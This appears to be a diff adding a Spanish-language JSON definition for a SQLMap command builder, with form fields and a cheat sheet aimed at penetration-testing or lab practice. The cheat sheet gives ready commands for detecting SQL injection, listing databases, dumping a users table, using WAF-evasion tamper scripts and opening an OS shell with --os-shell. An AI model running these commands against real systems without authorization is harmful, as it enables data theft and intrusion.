@@ -1,0 +1,125 @@
+{
+ "id": "sqlmap",
+ "name": "SQLMap",
+ "category": "Explotación web",
+ "binary": "sqlmap",
+ "summary": "Detecta y explota inyecciones SQL de forma automática: enumera bases de datos, tablas, hace dumps e incluso abre una shell del sistema.",
+ "questions": [
+  {
+   "id": "mode",
+   "type": "select",
+   "label": "¿Cómo defines el objetivo?",
+   "options": [
+    {"id": "url", "label": "URL con parámetro", "frag": ""},
+    {"id": "request", "label": "Petición HTTP capturada (Burp)", "frag": ""}
+   ]
+  },
+  {
+   "id": "u",
+   "type": "text",
+   "label": "URL con el parámetro a testear",
+   "flag": "-u \"{v}\"",
+   "placeholder": "http://10.10.10.10/page.php?id=1",
+   "required": true,
+   "when": {"mode": "url"},
+   "help": "El parámetro vulnerable va dentro de la URL."
+  },
+  {
+   "id": "r",
+   "type": "text",
+   "label": "Fichero de petición (formato Burp)",
+   "flag": "-r {v}",
+   "placeholder": "request.txt",
+   "required": true,
+   "when": {"mode": "request"},
+   "help": "Guarda la petición desde Burp con 'Save item' o 'Copy to file'."
+  },
+  {
+   "id": "data",
+   "type": "text",
+   "label": "Datos POST",
+   "flag": "--data=\"{v}\"",
+   "placeholder": "user=admin&pass=test",
+   "when": {"mode": "url"},
+   "help": "Déjalo vacío si el parámetro es GET."
+  },
+  {
+   "id": "cookie",
+   "type": "text",
+   "label": "Cookie de sesión",
+   "flag": "--cookie=\"{v}\"",
+   "placeholder": "PHPSESSID=abc123",
+   "help": "Opcional, necesaria si el endpoint requiere login."
+  },
+  {
+   "id": "level",
+   "type": "number",
+   "label": "Nivel de pruebas (--level)",
+   "flag": "--level={v}",
+   "default": "1",
+   "help": "1-5. A mayor nivel, más payloads y puntos de inyección testeados (headers, cookies...)."
+  },
+  {
+   "id": "risk",
+   "type": "number",
+   "label": "Nivel de riesgo (--risk)",
+   "flag": "--risk={v}",
+   "default": "1",
+   "help": "1-3. Risk 3 incluye payloads pesados (p.ej. OR-based) que pueden dañar datos."
+  },
+  {
+   "id": "action",
+   "type": "select",
+   "label": "¿Qué quieres hacer tras confirmar la inyección?",
+   "options": [
+    {"id": "banner", "label": "Solo confirmar e identificar el DBMS", "frag": "--banner"},
+    {"id": "dbs", "label": "Listar bases de datos", "frag": "--dbs"},
+    {"id": "current", "label": "Usuario/BD actual y privilegios", "frag": "--current-user --current-db --is-dba"},
+    {"id": "tables", "label": "Listar tablas de una BD", "frag": "--tables"},
+    {"id": "dump", "label": "Volcar una tabla", "frag": "--dump"},
+    {"id": "shell", "label": "Obtener shell del sistema operativo", "frag": "--os-shell"}
+   ]
+  },
+  {
+   "id": "db",
+   "type": "text",
+   "label": "Nombre de la base de datos",
+   "flag": "-D {v}",
+   "placeholder": "tienda",
+   "required": true,
+   "when": {"action": ["tables", "dump"]}
+  },
+  {
+   "id": "table",
+   "type": "text",
+   "label": "Nombre de la tabla",
+   "flag": "-T {v}",
+   "placeholder": "usuarios",
+   "required": true,
+   "when": {"action": "dump"}
+  },
+  {
+   "id": "tamper",
+   "type": "text",
+   "label": "Script tamper (evasión de WAF)",
+   "flag": "--tamper={v}",
+   "placeholder": "space2comment",
+   "help": "Opcional. Varios scripts se separan por comas."
+  },
+  {
+   "id": "batch",
+   "type": "bool",
+   "label": "Modo no interactivo (--batch)",
+   "flag": "--batch",
+   "default": true,
+   "help": "Acepta las respuestas por defecto sin preguntar nada por consola."
+  }
+ ],
+ "cheats": [
+  {"title": "Detección básica (GET)", "cmd": "sqlmap -u \"http://TARGET/page.php?id=1\" --batch"},
+  {"title": "Listar bases de datos", "cmd": "sqlmap -u \"http://TARGET/page.php?id=1\" --dbs --batch"},
+  {"title": "Dump de una tabla", "cmd": "sqlmap -u \"http://TARGET/page.php?id=1\" -D tienda -T usuarios --dump --batch"},
+  {"title": "Desde petición de Burp", "cmd": "sqlmap -r request.txt --batch --level=3 --risk=2"},
+  {"title": "Shell del sistema", "cmd": "sqlmap -u \"http://TARGET/page.php?id=1\" --os-shell --batch", "note": "Solo funciona si el DBMS y los permisos lo permiten (p.ej. MySQL con FILE)."}
+ ]
+}
